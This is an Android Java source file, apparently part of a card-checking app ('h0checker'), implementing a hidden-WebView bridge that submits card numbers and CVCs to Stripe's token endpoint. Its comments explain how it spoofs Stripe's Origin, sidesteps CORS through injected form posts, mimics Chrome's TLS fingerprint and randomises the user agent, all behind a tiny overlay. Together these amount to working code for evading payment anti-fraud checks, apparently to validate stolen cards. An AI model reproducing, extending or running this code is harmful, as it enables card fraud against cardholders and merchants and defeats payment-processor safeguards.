package com.h0checker.app;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.ValueCallback;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * Makes Stripe API calls by loading js.stripe.com in a WebView, then
 * injecting a <form> that POSTs to the Stripe API.
 *
 * WHY THIS WORKS:
 * 1. The WebView IS Chromium — same TLS fingerprint as Chrome (BoringSSL)
 * 2. After loading js.stripe.com, form submissions have Origin: https://js.stripe.com
 * 3. Form POSTs bypass CORS entirely (no same-origin policy for forms)
 * 4. No JavaScript callback needed — the response is displayed as text in the WebView
 * 5. We read the response from the DOM via evaluateJavascript("document.body.innerText")
 *
 * FLOW:
 * 1. Load https://js.stripe.com/v3/ (Stripe.js loader page)
 * 2. Wait for page to fully load (document.readyState === 'complete')
 * 3. Inject <form method="POST" action="https://api.stripe.com/v1/tokens"> with hidden fields
 * 4. Submit the form — WebView navigates to show the JSON response
 * 5. Wait for onPageFinished, then read document.body.innerText
 * 6. Navigate back to about:blank (cleanup)
 */
public class StripeWebBridge {

    private static final String TAG = "StripeBridge";
    private static StripeWebBridge instance;
    private Activity activity;
    private WebView webView;
    private boolean webViewReady = false;

    /** Synchronization for the current request */
    private CountDownLatch curLatch;
    private String[] curResult;

    @SuppressLint("SetJavaScriptEnabled")
    public static void init(Activity act) {
        if (instance != null) return;
        instance = new StripeWebBridge();
        instance.activity = act;
        act.runOnUiThread(() -> instance.createWebView(act));
    }

    public static StripeWebBridge getInstance() { return instance; }

    @SuppressLint("SetJavaScriptEnabled")
    private void createWebView(Activity act) {
        webView = new WebView(act);

        // Use a small but visible window — fully invisible WebViews get JS killed on some devices
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
            10, 10,
            WindowManager.LayoutParams.TYPE_APPLICATION_PANEL,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        );
        params.gravity = Gravity.TOP | Gravity.START;

        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setCacheMode(WebSettings.LOAD_DEFAULT);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        s.setUserAgentString(buildChromeUA());
        s.setDatabaseEnabled(true);

        webView.setBackgroundColor(Color.TRANSPARENT);
        webView.addJavascriptInterface(new BridgeJS(), "SB");

        // Attach as overlay
        try {
            act.addContentView(webView, params);
        } catch (Exception e) {
            ViewGroup root = (ViewGroup) act.getWindow().getDecorView()
                    .findViewById(android.R.id.content);
            root.addView(webView, new ViewGroup.LayoutParams(10, 10));
        }

        Log.i(TAG, "WebView created (10x10 overlay, Chromium TLS)");
    }

    /**
     * Execute a POST to Stripe API via form injection.
     *
     * @param siteUrl  The gate's site URL (used to determine context)
     * @param apiUrl   The full Stripe API URL (e.g., https://api.stripe.com/v1/tokens)
     * @param headers  Headers (Origin/Referer are set automatically by the browser)
     * @param body     URL-encoded POST body (e.g., card[number]=4242&card[cvc]=123&...)
     * @return JSON response from Stripe, or error JSON
     */
    public synchronized String post(String siteUrl, String apiUrl,
                                     Map<String, String> headers, String body) {
        if (activity == null || webView == null) {
            return "{\"error\":{\"message\":\"Bridge not initialized\"}}";
        }

        Log.i(TAG, "post() → " + apiUrl);

        // Step 1: Navigate to js.stripe.com to get correct Origin + Chromium TLS
        final CountDownLatch loadLatch = new CountDownLatch(1);
        final boolean[] loadOk = {false};

        activity.runOnUiThread(() -> {
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    Log.i(TAG, "Page loaded: " + url);
                    loadOk[0] = true;
                    loadLatch.countDown();
                }
                @Override
                public void onReceivedError(WebView view, int code, String desc, String url) {
                    Log.e(TAG, "Load error " + code + ": " + desc + " url=" + url);
                    loadLatch.countDown();
                }
            });
            webView.loadUrl("https://js.stripe.com/v3/");
        });

        try {
            if (!loadLatch.await(20, TimeUnit.SECONDS)) {
                Log.w(TAG, "js.stripe.com load timeout");
                return "{\"error\":{\"message\":\"Bridge: js.stripe.com load timeout\"}}";
            }
        } catch (InterruptedException e) {
            return "{\"error\":{\"message\":\"Bridge: interrupted during load\"}}";
        }

        if (!loadOk[0]) {
            return "{\"error\":{\"message\":\"Bridge: failed to load js.stripe.com\"}}";
        }

        // Step 2: Wait for document.readyState === 'complete'
        waitForReady(10);
        // Extra settle time for Stripe.js initialization
        try { Thread.sleep(2000); } catch (InterruptedException ignored) {}

        // Step 3: Verify JS interface works with a test call
        final boolean[] sbWorks = {false};
        final CountDownLatch testLatch = new CountDownLatch(1);
        final String[] testResult = {null};

        activity.runOnUiThread(() -> {
            webView.evaluateJavascript(
                "(function(){try{if(typeof SB!=='undefined'){SB.__test='ok';return 'ok'}return 'no_sb'}catch(e){return 'err:'+e.message}})()",
                value -> {
                    testResult[0] = value;
                    if (value != null && value.contains("ok")) sbWorks[0] = true;
                    testLatch.countDown();
                }
            );
        });
        try { testLatch.await(5, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}
        Log.i(TAG, "SB test: " + testResult[0] + " works=" + sbWorks[0]);

        // Step 4: Inject form and submit
        String formJs = buildFormJs(apiUrl, body);
        Log.i(TAG, "Injecting form (" + formJs.length() + " chars)");

        curLatch = new CountDownLatch(1);
        curResult = new String[]{null};

        final CountDownLatch submitLatch = new CountDownLatch(1);
        activity.runOnUiThread(() -> {
            webView.evaluateJavascript(formJs, value -> {
                Log.i(TAG, "Form injected: " + value);
                submitLatch.countDown();
            });
        });
        try { submitLatch.await(10, TimeUnit.SECONDS); } catch (InterruptedException ignored) {}

        // Step 5: Wait for response page to load
        // The form submission navigates the WebView to the Stripe API response
        final CountDownLatch responseLatch = new CountDownLatch(1);

        activity.runOnUiThread(() -> {
            webView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    Log.i(TAG, "Response page loaded: " + url);
                    // Read the JSON response from the page
                    view.evaluateJavascript(
                        "(function(){try{var p=document.querySelector('pre');return p?p.textContent:document.body.innerText}catch(e){return '{\"error\":{\"message\":\"read:'+e.message+'\"}}'}})()",
                        value -> {
                            Log.i(TAG, "Response read: " + (value != null ? value.substring(0, Math.min(value.length(), 300)) : "null"));
                            if (curResult != null) curResult[0] = value;
                            if (curLatch != null) curLatch.countDown();
                            responseLatch.countDown();
                        }
                    );
                }
                @Override
                public void onReceivedError(WebView view, int code, String desc, String url) {
                    Log.e(TAG, "Response error " + code + ": " + desc);
                    if (curResult != null) curResult[0] = "{\"error\":{\"message\":\"HTTP " + code + ": " + desc + "\"}}";
                    if (curLatch != null) curLatch.countDown();
                    responseLatch.countDown();
                }
            });
        });

        // If SB works, also try the callback approach as primary (faster, doesn't require navigation)
        if (sbWorks[0]) {
            executeViaCallback(apiUrl, body, headers);
        }

        try {
            // Wait for either callback or response navigation (whichever comes first)
            curLatch.await(25, TimeUnit.SECONDS);
        } catch (InterruptedException e) {
            return "{\"error\":{\"message\":\"Bridge: interrupted\"}}";
        }

        // Step 6: Cleanup — navigate away
        activity.runOnUiThread(() -> webView.loadUrl("about:blank"));

        String result = curResult[0];
        curLatch = null;
        curResult = null;

        if (result != null) {
            // Strip surrounding quotes if present (evaluateJavascript wraps strings)
            if (result.startsWith("\"") && result.endsWith("\"")) {
                result = result.substring(1, result.length() - 1);
                result = result.replace("\\\"", "\"").replace("\\n", "\n").replace("\\\\", "\\");
            }
            Log.i(TAG, "Result: " + result.substring(0, Math.min(result.length(), 300)));
            return result;
        }

        Log.e(TAG, "No response from bridge (timeout)");
        return "{\"error\":{\"message\":\"No response from bridge\"}}";
    }

    /**
     * Try the JS callback approach as primary (faster than form submission).
     * If SB is accessible, this gives us the result without navigating the WebView.
     */
    private void executeViaCallback(String apiUrl, String body, Map<String, String> headers) {
        StringBuilder headersJs = new StringBuilder("{");
        boolean first = true;
        for (Map.Entry<String, String> e : headers.entrySet()) {
            String k = e.getKey();
            if (k.equalsIgnoreCase("Origin") || k.equalsIgnoreCase("Referer")) continue;
            if (!first) headersJs.append(",");
            headersJs.append(jsStr(k)).append(":").append(jsStr(e.getValue()));
            first = false;
        }
        headersJs.append("}");

        String js = "(function(){" +
            "try{" +
            "  var p=fetch(" + jsStr(apiUrl) + ",{" +
            "    method:'POST'," +
            "    headers:" + headersJs + "," +
            "    body:" + jsStr(body) + "," +
            "    mode:'cors'," +
            "    credentials:'omit'" +
            "  });" +
            "  p.then(function(r){" +
            "    return r.text().then(function(t){" +
            "      try{SB.onResult(r.status,t)}catch(e){" +
            "        try{SB.onError('cb:'+e.message)}catch(e2){}" +
            "      }" +
            "    });" +
            "  })[" + "catch](function(e){" +
            "    try{SB.onError('catch:'+e.message)}catch(e2){}" +
            "  });" +
            "  p[" + "catch](function(e){" +
            "    try{SB.onError('promise:'+e.message)}catch(e2){}" +
            "  });" +
            "}catch(e){try{SB.onError('throw:'+e.message)}catch(e2){}}" +
            "})()";

        final String fjs = js;
        activity.runOnUiThread(() -> {
            try {
                webView.evaluateJavascript(fjs, v -> Log.d(TAG, "fetch eval=" + v));
            } catch (Exception e) {
                Log.e(TAG, "fetch eval failed: " + e.getMessage());
            }
        });
    }

    /**
     * Build a JavaScript string that creates a form and submits it.
     * The form targets the Stripe API endpoint with all parameters as hidden fields.
     */
    private String buildFormJs(String apiUrl, String body) {
        StringBuilder js = new StringBuilder();
        js.append("(function(){try{");
        js.append("var f=document.createElement('form');");
        js.append("f.method='POST';");
        js.append("f.action=").append(jsStr(apiUrl)).append(";");
        js.append("f.style.display='none';");

        // Parse URL-encoded body into hidden fields
        String[] pairs = body.split("&");
        for (String pair : pairs) {
            int eq = pair.indexOf('=');
            if (eq > 0) {
                String key = pair.substring(0, eq);
                String val = pair.substring(eq + 1);
                js.append("var i=document.createElement('input');");
                js.append("i.type='hidden';");
                js.append("i.name=").append(jsStr(key)).append(";");
                js.append("i.value=").append(jsStr(val)).append(";");
                js.append("f.appendChild(i);");
            }
        }

        js.append("document.body.appendChild(f);");
        js.append("f.submit();");
        js.append("return 'submitted'");
        js.append("}catch(e){return 'error:'+e.message}})()");
        return js.toString();
    }

    /**
     * Wait for document.readyState to be 'complete'.
     */
    private void waitForReady(int maxSeconds) {
        for (int i = 0; i < maxSeconds * 2; i++) {
            final CountDownLatch latch = new CountDownLatch(1);
            final String[] state = {null};

            activity.runOnUiThread(() -> {
                webView.evaluateJavascript(
                    "document.readyState",
                    value -> { state[0] = value; latch.countDown(); }
                );
            });

            try { latch.await(500, TimeUnit.MILLISECONDS); } catch (InterruptedException ignored) {}
            if (state[0] != null && state[0].contains("complete")) {
                Log.i(TAG, "Page ready");
                return;
            }
            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
        }
        Log.w(TAG, "waitForReady timeout");
    }

    private static String jsStr(String s) {
        if (s == null) return "''";
        return "'" + s.replace("\\", "\\\\").replace("'", "\\'")
                      .replace("\n", "\\n").replace("\r", "\\r")
                      .replace("/", "\\/") + "'";
    }

    private static String buildChromeUA() {
        int v = 128 + (int)(Math.random() * 10);
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"
            + v + ".0.0.0 Safari/537.36";
    }

    /**
     * JavaScript interface for receiving results from fetch() callbacks.
     * Only used as a fast path when SB is accessible. The form submission
     * fallback doesn't need this.
     */
    public class BridgeJS {
        @android.webkit.JavascriptInterface
        public void onResult(int status, String body) {
            Log.i(TAG, "BridgeJS OK status=" + status + " len=" + (body != null ? body.length() : 0));
            if (curResult != null) curResult[0] = body;
            if (curLatch != null) curLatch.countDown();
        }

        @android.webkit.JavascriptInterface
        public void onError(String msg) {
            Log.e(TAG, "BridgeJS error: " + msg);
            // Don't count down on error from fetch — let the form submission fallback handle it
            // Only count down if we're sure fetch is the only path
            if (curResult != null && curResult[0] == null) {
                curResult[0] = "{\"error\":{\"message\":\"" + msg.replace("\"", "'") + "\"}}";
            }
            // Don't count down — let form submission path or timeout handle it
        }
    }

    public void destroy() {
        if (webView != null) {
            webView.post(() -> {
                webView.loadUrl("about:blank");
                webView.destroy();
            });
        }
        instance = null;
    }
}
